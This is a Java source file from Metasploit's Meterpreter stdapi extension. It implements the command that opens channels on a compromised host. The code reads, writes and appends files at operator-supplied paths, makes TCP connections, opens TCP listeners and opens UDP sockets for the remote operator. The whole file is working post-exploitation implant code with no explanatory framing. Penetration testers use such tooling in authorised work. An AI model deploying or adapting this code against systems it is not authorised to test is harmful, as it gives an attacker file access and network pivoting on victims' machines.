package com.metasploit.meterpreter.stdapi;

import java.io.ByteArrayInputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.ConnectException;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;

import com.metasploit.meterpreter.Channel;
import com.metasploit.meterpreter.DatagramSocketChannel;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.ServerSocketChannel;
import com.metasploit.meterpreter.SocketChannel;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;
import com.metasploit.meterpreter.command.NotYetImplementedCommand;

public class stdapi_channel_open implements Command {

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        String channelType = request.getStringValue(TLVType.TLV_TYPE_CHANNEL_TYPE);
        if (channelType.equals("stdapi_fs_file")) {
            return executeFsFile(meterpreter, request, response);
        }
        if (channelType.equals("stdapi_net_tcp_client")) {
            return executeTcpClient(meterpreter, request, response);
        }
        if (channelType.equals("stdapi_net_tcp_server")) {
            return executeTcpServer(meterpreter, request, response);
        }
        if (channelType.equals("stdapi_net_udp_client")) {
            return executeUdpClient(meterpreter, request, response);
        }
        return ERROR_FAILURE;
    }

    private int executeFsFile(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        String fpath = request.getStringValue(TLVType.TLV_TYPE_FILE_PATH);
        String mode = request.getStringValue(TLVType.TLV_TYPE_FILE_MODE, "rb");
        Channel channel;
        if (mode.equals("r") || mode.equals("rb") || mode.equals("rbb")) {
            channel = null;
            if (fpath.equals("...")) {
                byte[] data = meterpreter.getErrorBuffer();
                if (data != null) {
                    channel = new Channel(meterpreter, new ByteArrayInputStream(data), null);
                }
            }
            if (channel == null) {
                channel = new Channel(meterpreter, new FileInputStream(Loader.expand(fpath)), null);
            }
        } else if (mode.equals("w") || mode.equals("wb") || mode.equals("wbb")) {
            channel = new Channel(meterpreter, new ByteArrayInputStream(new byte[0]), new FileOutputStream(Loader.expand(fpath).getPath(), false));
        } else if (mode.equals("a") || mode.equals("ab") || mode.equals("abb")) {
            channel = new Channel(meterpreter, new ByteArrayInputStream(new byte[0]), new FileOutputStream(Loader.expand(fpath).getPath(), true));
        } else {
            NotYetImplementedCommand.INSTANCE.execute(meterpreter, request, response);
            throw new IllegalArgumentException("Unsupported file mode: " + mode);
        }
        response.add(TLVType.TLV_TYPE_CHANNEL_ID, channel.getID());
        return ERROR_SUCCESS;
    }

    private int executeUdpClient(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        String localHost = request.getStringValue(TLVType.TLV_TYPE_LOCAL_HOST);
        int localPort = request.getIntValue(TLVType.TLV_TYPE_LOCAL_PORT);
        String peerHost = request.getStringValue(TLVType.TLV_TYPE_PEER_HOST);
        int peerPort = request.getIntValue(TLVType.TLV_TYPE_PEER_PORT);

        DatagramSocket ds = new DatagramSocket(localPort, InetAddress.getByName(localHost));
        if (peerPort != 0) {
            ds.connect(InetAddress.getByName(peerHost), peerPort);
        }
        Channel channel = new DatagramSocketChannel(meterpreter, ds);
        response.add(TLVType.TLV_TYPE_CHANNEL_ID, channel.getID());
        return ERROR_SUCCESS;
    }

    private int executeTcpServer(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws UnknownHostException, IOException {
        String localHost = request.getStringValue(TLVType.TLV_TYPE_LOCAL_HOST);
        int localPort = request.getIntValue(TLVType.TLV_TYPE_LOCAL_PORT);
        ServerSocket ss = getSocket(localHost, localPort);
        Channel channel = new ServerSocketChannel(meterpreter, ss);
        response.add(TLVType.TLV_TYPE_CHANNEL_ID, channel.getID());
        return ERROR_SUCCESS;
    }

    private ServerSocket getSocket(String localHost, int localPort) throws UnknownHostException, IOException {
        try {
            if (localHost.equals("0.0.0.0")) {
                return getIPv4Socket_java7plus(localHost, localPort);
            }
        } catch (UnknownHostException e) {
            throw e;
        }
         catch (Exception e) {
            // Fall back to old behaviour: will listen on IPv4 and IPv6
        }
        return new ServerSocket(localPort, 50, InetAddress.getByName(localHost));
    }

    // Constructing a ServerSocket directly for 0.0.0.0 will listen on both IPv4 and IPv6, which, if the operator has explicitly requested 0.0.0.0,
    // may not be desirable. Java 7 and later support explicitly specifying IPv4 using ServerSocketChannel.open(StandardProtocolFamily.INET).
    // To keep backwards-compatibility, we use reflection to call the newer version.
    private ServerSocket getIPv4Socket_java7plus(String localHost, int localPort) throws Exception {
        Class standardProtocolFamilyCls = Class.forName("java.net.StandardProtocolFamily");
        Class protocolFamilyCls = Class.forName("java.net.ProtocolFamily");
        java.lang.reflect.Method getValueMethod = standardProtocolFamilyCls.getMethod("valueOf", String.class);
        Object inet = getValueMethod.invoke(null, "INET");
        Class sscClazz = java.nio.channels.ServerSocketChannel.class;
        java.lang.reflect.Method method = sscClazz.getMethod("open", protocolFamilyCls);
        java.nio.channels.ServerSocketChannel server = (java.nio.channels.ServerSocketChannel)method.invoke(null, inet);
        InetAddress addr = InetAddress.getByName(localHost);
        InetSocketAddress sockAddr = new InetSocketAddress(addr, localPort);
        java.lang.reflect.Method bindMethod = sscClazz.getMethod("bind", java.net.SocketAddress.class);
        bindMethod.invoke(server, sockAddr);
        ServerSocket ss = server.socket();
        return ss;
    }

    private int executeTcpClient(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        String peerHost = request.getStringValue(TLVType.TLV_TYPE_PEER_HOST);
        int peerPort = request.getIntValue(TLVType.TLV_TYPE_PEER_PORT);
        String localHost = request.getStringValue(TLVType.TLV_TYPE_LOCAL_HOST);
        int localPort = request.getIntValue(TLVType.TLV_TYPE_LOCAL_PORT);
        int retries = ((Integer) request.getValue(TLVType.TLV_TYPE_CONNECT_RETRIES, new Integer(1))).intValue();
        if (retries < 1) {
            retries = 1;
        }
        InetAddress peerAddr = InetAddress.getByName(peerHost);
        InetAddress localAddr = InetAddress.getByName(localHost);
        Socket socket = null;
        for (int i = 0; i < retries; i++) {
            try {
                socket = new Socket(peerAddr, peerPort, localAddr, localPort);
                break;
            } catch (ConnectException ex) {
                if (i == retries - 1) {
                    throw ex;
                }
            }
        }

        // If we got here, the connection worked, respond with the new channel ID
        Channel channel = new SocketChannel(meterpreter, socket);
        channel.startInteract();
        response.add(TLVType.TLV_TYPE_CHANNEL_ID, channel.getID());
        return ERROR_SUCCESS;
    }
}
